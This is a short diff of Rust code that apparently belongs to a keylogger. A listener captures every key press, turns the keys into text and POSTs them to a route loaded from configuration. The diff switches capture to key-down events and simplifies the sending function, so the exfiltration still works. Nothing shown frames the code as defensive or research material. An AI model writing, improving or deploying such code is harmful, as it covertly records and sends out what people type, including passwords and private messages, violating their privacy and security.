@@ -22,7 +22,7 @@ pub fn cat(){
 
 fn listen(device_state:DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
 
-    device_state.on_key_up(|keys| {
+    device_state.on_key_down(|keys| {
 
         let mut cache: String = String::new();
         let chars = keycode_to_string(*keys).chars();
@@ -34,7 +34,7 @@ fn listen(device_state:DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
     )
 }
 
-fn send(chars: String) -> Result<Response, reqwest::Error> {
+fn send(chars: String) {
     println!("send function test");
 
     let route = load_route();
@@ -45,8 +45,7 @@ fn send(chars: String) -> Result<Response, reqwest::Error> {
     println!("{}", req);
     let client = Client::new();
     let r = client.post(req).build().unwrap();
-    let r = client.execute(r).unwrap();
-    Ok(r)
+    let _ = client.execute(r).unwrap();
     
 }
 
